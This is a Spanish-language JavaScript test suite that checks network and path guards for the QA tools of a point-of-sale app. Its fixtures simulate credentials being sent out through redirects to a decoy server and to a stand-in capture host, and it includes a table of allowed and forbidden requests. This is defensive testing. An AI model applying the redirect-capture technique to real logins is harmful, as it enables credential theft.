await caso('F10A-03b: raíz sustituida por una junction tras arrancar → la ruta directa y el FALLBACK de SPA dan 403, nunca el índice ajeno; antes, SPA y assets propios intactos', async () => {
  const conCache = await probarFallbackTrasArranque(S('fase10a/servir-como-pages.cjs'), 'v3-a')
  const sinCache = await probarFallbackTrasArranque(S('fase10a/servir-como-pages.cjs'), 'v3-b', { conAntes: false })
  const { antes } = conCache
  assert.equal(antes.ventas.estado, 200); assert.equal(antes.raiz.estado, 200); assert.equal(antes.asset.estado, 200)
  for (const { despues } of [conCache, sinCache]) for (const [k, r] of Object.entries(despues)) { assert.equal(r.ajeno, false, `${k} devolvió el índice ajeno`); assert.equal(r.estado, 403, `${k} → ${r.estado}`) }
  const estados = (o) => Object.fromEntries(Object.entries(o).map(([k, v]) => [k, v.estado]))
  return { antes: estados(antes), despuesConIndiceEnCache: estados(conCache.despues), despuesSinPeticionPrevia: estados(sinCache.despues) }
})
await caso('F10A-03b: reproducción del defecto en la V2 (copia de rollback): /index.html 403 pero el fallback /ventas devolvía 200 con el índice ajeno', async () => {
  const { despues } = await probarFallbackTrasArranque(join(RAIZ, '.codex/evidencia-fase10a-v3/rollback/v2/servir-como-pages.cjs'), 'v2', { conAntes: false })
  assert.equal(despues.indice.estado, 403); assert.equal(despues.ventas.estado, 200); assert.equal(despues.ventas.ajeno, true)
  return { v2: Object.fromEntries(Object.entries(despues).map(([k, v]) => [k, `${v.estado}${v.ajeno ? ' AJENO' : ''}`])) }
})
await caso('F10A-03: reproducción del defecto en la V1 (copia de rollback): el prefijo vecino SÍ devolvía la marca', async () => {
  const v1 = join(RAIZ, '.codex/evidencia-fase10a-v2/rollback/v1/servir-como-pages.cjs')
  const { r, MARCA } = await probarServidor(v1, 'v1')
  assert.equal(r.prefijo.estado, 200); assert.equal(r.prefijo.cuerpo, MARCA)
  return { v1: Object.fromEntries(Object.entries(r).map(([k, v]) => [k, v.estado])) }
})

// ======================= F10A-01: guardas =======================
await caso('F10A-01: validación de --app (remota, LAN, el propio Supabase, credenciales, query) y de cuentas (ajena, sin id)', () => {
  for (const a of ['https://feat-cloudflare-pages.pos-jaise.pages.dev', 'http://192.168.1.5:5401', 'http://127.0.0.1:54321', 'http://u:p@127.0.0.1:5401', 'http://127.0.0.1:5401/?x=1', 'http://127.0.0.1', 'file:///C:/dist/index.html']) assert.throws(() => G.validarApp(a), undefined, a)
  assert.equal(G.validarApp('http://127.0.0.1:5404/PosJaise/').app, 'http://127.0.0.1:5404/PosJaise')
  assert.throws(() => G.validarCuentas({ admin: { email: 'duena@ejemplo.invalid', id: randomUUID(), password: 'x' } }, ['admin']), /no es una cuenta QA/)
  assert.throws(() => G.validarCuentas({ admin: { email: 'qa-x@test.local', password: 'x' } }, ['admin']), /id/)
  assert.throws(() => G.validarCuentas({}, ['admin']), /no es una cuenta QA/)
})
await caso('F10A-01: backend efectivo del bundle — Local exacto pasa; otro puerto, relativo/proxy, Supabase remoto, dos configuraciones o ninguna se rechazan', () => {
  const mod = (url) => ({ url: 'http://127.0.0.1:1/assets/x.js', texto: `var zi=\`${url}\`,Bi=zi.startsWith(\`/\`)?\`\${window.location.origin}\${zi}\`:zi,` })
  G.exigirBackendLocal(G.backendDeModulos([mod('http://127.0.0.1:54321')]))
  for (const mods of [[mod('http://127.0.0.1:55555')], [mod('/__supabase')], [mod('https://abcd.supabase.co')], [mod('http://127.0.0.1:54321'), mod('http://127.0.0.1:55555')], [{ url: 'x', texto: 'nada' }], [mod('http://127.0.0.1:54321'), { url: 'y', texto: 'fetch("https://cmkelllerzjqjbsqsylc.supabase.co/rest/v1")' }]]) {
    assert.throws(() => G.exigirBackendLocal(G.backendDeModulos(mods)))
  }
})
await caso('F10A-01: clasificación de peticiones del navegador (app solo lectura sin rutas de API; Supabase Local; terceros GET neutralizados; lo demás prohibido)', () => {
  const app = 'http://127.0.0.1:5401'
  const tabla = [
    ['http://127.0.0.1:5401/assets/a.js', 'GET', 'permitida'], ['http://127.0.0.1:5401/ventas', 'GET', 'permitida'],
    ['http://127.0.0.1:5401/auth/v1/token', 'POST', 'prohibida'], ['http://127.0.0.1:5401/__supabase/rest/v1/x', 'GET', 'prohibida'], ['http://127.0.0.1:5401/x', 'POST', 'prohibida'],
    ['http://127.0.0.1:54321/auth/v1/token?grant_type=password', 'POST', 'permitida'], ['http://127.0.0.1:54321/rest/v1/productos', 'GET', 'permitida'],
    ['https://fonts.googleapis.com/css2?family=Inter', 'GET', 'neutralizada'], ['https://fonts.gstatic.com/x.woff2', 'GET', 'neutralizada'],
    ['http://127.0.0.1:55555/token', 'POST', 'prohibida'], ['http://127.0.0.1:55555/login', 'GET', 'prohibida'], ['http://localhost:54321/rest/v1/x', 'GET', 'prohibida'],
    ['https://cmkelllerzjqjbsqsylc.supabase.co/rest/v1/x', 'GET', 'prohibida'], ['https://api.culqi.com/v2/tokens', 'GET', 'prohibida'], ['https://ejemplo.com/beacon', 'POST', 'prohibida'],
    ['data:image/png;base64,AA', 'GET', 'permitida'],
  ]
  for (const [u, m, esperado] of tabla) assert.equal(G.clasificarPeticion(u, m, app), esperado, `${m} ${u}`)
})

if (APP_REAL) {
  await caso('F10A-01: CONTROL POSITIVO — preflight de la app real (bundle servido con backend Local exacto y cuentas QA de Local)', async () => {
    const pre = await G.preflightLocal({ app: APP_REAL, cuentas: { admin: identidad('admin'), cajera: identidad('cajera'), clienteA: identidad('clienteA') }, claves: ['admin', 'cajera', 'clienteA'] })
    assert.equal(pre.api, G.API_LOCAL); assert.ok(pre.modulosRevisados > 10)
    return pre
  })
}

// V3 (F10A-01b): la guarda real (contextoSeguro + proxy) con Chromium y servidores propios, sin cuentas ni Supabase.
if (!SIN_NAVEGADOR) {
  await caso('F10A-01b: redirecciones EN EJECUCIÓN (fetch, recurso y navegación; 302/303/307/308; otro puerto, externo simulado, cadena) no transmiten nada; redirección interna, CONNECT ajeno y throttling', async () => {
    const { chromium } = require('playwright')
    const s = await senuelo()
    const sen = (cod, q = '') => `http://127.0.0.1:${s.puerto}/captura-${cod}?clave=${CLAVE}${q}`
    const app = await servidor((req, res) => {
      const u = new URL(req.url, 'http://x')
      const m = u.pathname.match(/^\/rebote\/(30[2378])\/(senuelo|externo)$/)
      if (m) { res.writeHead(Number(m[1]), { Location: m[2] === 'senuelo' ? sen(m[1]) : `http://capturador.qa-f10a.invalid/captura?clave=${CLAVE}` }); return res.end() }
      if (u.pathname === '/cadena') { res.writeHead(302, { Location: '/cadena-2' }); return res.end() }
      if (u.pathname === '/cadena-2') { res.writeHead(308, { Location: sen('cadena') }); return res.end() }
      if (u.pathname === '/interno') { res.writeHead(302, { Location: '/destino' }); return res.end() }
      if (u.pathname === '/destino') { res.writeHead(200, { 'Content-Type': 'text/plain' }); return res.end('OK interno') }
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }); res.end('<!doctype html><title>QA</title><p>pagina QA</p>')
    })
    const APP = `http://127.0.0.1:${app.puerto}`
    const guarda = G.crearGuarda(APP)
    const navegador = await chromium.launch({ headless: true })
    try {
      const ctx = await G.contextoSeguro(navegador, {}, guarda)
      const page = await ctx.newPage()
      await page.goto(`${APP}/`)
      const rutas = ['/rebote/302/senuelo', '/rebote/303/senuelo', '/rebote/307/senuelo', '/rebote/308/senuelo', '/rebote/302/externo', '/cadena']
      const fetches = await page.evaluate((rs) => Promise.all(rs.map((r) => fetch(r).then((x) => x.status, () => 'error'))), rutas)
      // recurso (imagen) que redirige, y navegación que redirige
      await page.evaluate(() => new Promise((ok) => { const i = new Image(); i.onload = i.onerror = () => ok(); i.src = '/rebote/307/senuelo' }))
      const nav = await page.goto(`${APP}/rebote/303/senuelo`).then((r) => r?.status() ?? null, () => 'error')
      await page.goto(`${APP}/`)
      const interno = await page.evaluate(() => fetch('/interno').then(async (x) => `${x.status} ${await x.text()}`))
      await ctx.close()
      // CONNECT (túnel) hacia un destino ajeno, pedido directamente al proxy de guarda: se niega sin conectar.
      const g2 = G.crearGuarda(APP), px = await G.crearProxyGuarda(g2)
      const tunel = await new Promise((ok) => {
        const q = http.request({ host: '127.0.0.1', port: new URL(px.url).port, method: 'CONNECT', path: `127.0.0.1:${s.puerto}` })
        q.on('connect', (r, sock) => { sock.destroy(); ok(r.statusCode) }); q.on('error', (e) => ok(String(e.message))); q.end()
      })
      await px.cerrar()
      // Throttling: la emulación de red de CDP se aplica antes del proxy (latencia de 600 ms por petición).
      const ctx2 = await G.contextoSeguro(navegador, {}, G.crearGuarda(APP))
      const p2 = await ctx2.newPage()
      await p2.goto(`${APP}/`)
      const cdp = await ctx2.newCDPSession(p2)
      await cdp.send('Network.enable')
      await cdp.send('Network.emulateNetworkConditions', { offline: false, latency: 600, downloadThroughput: -1, uploadThroughput: -1 })
      const msThrottle = await p2.evaluate(async () => { const t = performance.now(); await fetch(`/destino?x=${Math.random()}`, { cache: 'no-store' }); return performance.now() - t })
      await ctx2.close()

      assert.deepEqual(s.peticiones, [], `el señuelo recibió: ${s.peticiones.map((p) => `${p.metodo} ${p.url}`).join(', ')}`)
      for (const [i, st] of fetches.entries()) assert.ok(st === 'error' || st === 403, `${rutas[i]} → ${st}`)
      assert.equal(interno, '200 OK interno', 'la redirección dentro de la app debe seguir funcionando')
      assert.ok(app.peticiones.some((p) => p.url === '/destino'))
      assert.equal(tunel, 403)
      assert.ok(guarda.violaciones.filter((v) => v.startsWith('salto ')).length >= 6, guarda.violaciones.join(' | '))
      assert.ok(guarda.violaciones.some((v) => v.includes('capturador.qa-f10a.invalid')), 'el salto externo simulado no quedó registrado')
      assert.ok(g2.violaciones.some((v) => v.startsWith('tunel CONNECT')))
      assert.ok(msThrottle >= 550, `el throttling no se aplicó a través del proxy (${msThrottle.toFixed(0)} ms)`)
      return { peticionesAlSenuelo: 0, fetches: Object.fromEntries(rutas.map((r, i) => [r, fetches[i]])), navegacion: nav, interno, tunelAjeno: tunel, msConLatencia600: Math.round(msThrottle), violaciones: [...new Set(guarda.violaciones)].map((v) => v.replace(CLAVE, '<clave>')) }
    } finally {
      await navegador.close(); await s.cerrar(); await app.cerrar()
    }
  })
}

// Casos de extremo a extremo con las dos herramientas reales.
const HERRAMIENTAS = [
  ['medir-vitales', S('fase10a/medir-vitales-10a.cjs'), (app, cuentas, n) => [`--app=${app}`, `--cuentas=${cuentas}`, `--salida=${join(TMP, `vitales-${n}.json`)}`, '--muestras=1']],
  ['verificar-roles', S('fase10a/verificar-roles-rutas.cjs'), (app, cuentas, n) => [`--app=${app}`, `--cuentas=${cuentas}`, `--salida=${join(TMP, `roles-${n}.json`)}`]],
]
const cuentasQA = escribirJson('cuentas-qa-inventadas.json', { admin: identidad('admin'), cajera: identidad('cajera'), clienteA: identidad('clienteA') })
const cuentasAjena = escribirJson('cuentas-ajena.json', { admin: { ...identidad('admin'), email: 'duena.del.salon@ejemplo.invalid' }, cajera: identidad('cajera'), clienteA: identidad('clienteA') })
const cuentasInexistente = escribirJson('cuentas-inexistente.json', { admin: { email: `qa-f10a-inexistente-${randomBytes(3).toString('hex')}@test.local`, id: randomUUID(), password: CLAVE }, cajera: identidad('cajera'), clienteA: identidad('clienteA') })
const ESCENARIOS = [
  // [nombre, opciones de la app falsa (null = app remota), cuentas, motivo esperado, necesita navegador]
  ['app remota', null, cuentasQA, /debe ser una app local/, false],
  ['app local con backend ajeno en el bundle', { backend: 'SENUELO' }, cuentasQA, /backend efectivo del bundle no es exactamente/, false],
  ['app local con proxy del mismo origen (/__supabase)', { backend: '/__supabase' }, cuentasQA, /relativo \/__supabase/, false],
  ['cuenta ajena al conjunto QA', { backend: G.API_LOCAL }, cuentasAjena, /no es una cuenta QA ficticia/, false],
  ['cuenta QA que no existe en el Auth de Local', { backend: G.API_LOCAL }, cuentasInexistente, /no existen en el Auth de Local/, false],
  ['login redirigido a otro servidor', { backend: G.API_LOCAL, redirigirLogin: true }, cuentasQA, /la app redirige \/login \(302\)/, true],
  ['credenciales desviadas a otro servidor (y WebSocket) al enviar el login', { backend: G.API_LOCAL, desvio: 'senuelo' }, cuentasQA, /guarda de red/, true],
  ['credenciales desviadas por proxy del mismo origen al enviar el login', { backend: G.API_LOCAL, desvio: 'proxy' }, cuentasQA, /guarda de red/, true],
  // V3 (F10A-01b): login 200 y, al enviar, un GET permitido a la app que esta redirige al señuelo (un salto y una cadena 303→307).
  // La app aprobada sí recibe ese GET (es la app que se mide); lo que no debe ocurrir es que el salto llegue al señuelo.
  ['credenciales en un GET permitido que la app REDIRIGE (302) al señuelo al enviar el login', { backend: G.API_LOCAL, desvio: 'rebote', appRecibeGet: true }, cuentasQA, /guarda de red.*salto GET http:\/\/127\.0\.0\.1:\d+\/captura/, true],
  ['credenciales en un GET permitido con CADENA de redirecciones (303 dentro de la app → 307 al señuelo)', { backend: G.API_LOCAL, desvio: 'cadena', appRecibeGet: true }, cuentasQA, /guarda de red.*salto GET http:\/\/127\.0\.0\.1:\d+\/captura/, true],
]
let n = 0
for (const [nombre, opciones, cuentas, motivo, conNavegador] of ESCENARIOS) {
  if (conNavegador && SIN_NAVEGADOR) continue
  for (const [herramienta, script, args] of HERRAMIENTAS) {
    await caso(`F10A-01: ${herramienta} · ${nombre} → se niega; cero credenciales enviadas, cero escrituras a la app y cero provisiones`, async () => {
      n += 1
      const s = await senuelo()
      const app = opciones ? await appFalsa({ ...opciones, backend: opciones.backend === 'SENUELO' ? `http://127.0.0.1:${s.puerto}` : opciones.backend, puertoSenuelo: s.puerto }) : null
      const antes = asistentesTemporales()
      try {
        const r = await correr(script, args(app ? `http://127.0.0.1:${app.puerto}` : 'https://feat-cloudflare-pages.pos-jaise.pages.dev', cuentas, n), 600000)
        const despues = asistentesTemporales()
        const todo = [...s.peticiones, ...(opciones?.appRecibeGet ? [] : app?.peticiones ?? [])]
        assert.notEqual(r.codigo, 0, `debía negarse: ${r.salida.slice(-300)}`)
        assert.match(r.salida, motivo, `motivo inesperado: ${r.salida.slice(-400)}`)
        assert.ok(!todo.some((p) => p.url.includes(CLAVE) || p.cuerpo.includes(CLAVE)), 'la contraseña inventada llegó a un servidor')
        assert.ok(!todo.some((p) => p.url.includes(encodeURIComponent(reales.admin.email)) || p.cuerpo.includes(reales.admin.email)), 'un correo QA llegó a un servidor')
        assert.deepEqual(s.peticiones, [], 'el señuelo recibió alguna petición (ni siquiera un GET debe salir hacia él)')
        assert.deepEqual((app?.peticiones ?? []).filter((p) => p.metodo !== 'GET'), [], 'la app falsa recibió escrituras')
        assert.equal(despues, antes, 'se provisionó (o quedó) una asistente temporal')
        return { codigo: r.codigo, cola: r.salida.trim().split('\n').filter((l) => !/^\s+at /.test(l)).slice(-4).map((l) => l.slice(0, 220)), peticionesAlSenuelo: s.peticiones.map((p) => `${p.metodo} ${p.url}`), escriturasALaApp: 0, asistentesTemporales: despues, motivo: (r.salida.match(motivo) ?? [])[0] }
      } finally {
        await s.cerrar(); await app?.cerrar()
      }
    })
  }
}

rmSync(TMP, { recursive: true, force: true })
const fallos = casos.filter((c) => !c.ok)
if (SALIDA) writeFileSync(SALIDA, JSON.stringify({ fecha: new Date().toISOString(), appReal: APP_REAL ?? null, sinNavegador: SIN_NAVEGADOR, total: casos.length, fallos: fallos.length, casos }, null, 1))
console.log(`\n${casos.length - fallos.length}/${casos.length} correctos`)
process.exitCode = fallos.length ? 1 : 0 // no process.exit(): ver medir-rendimiento-10a.mjs
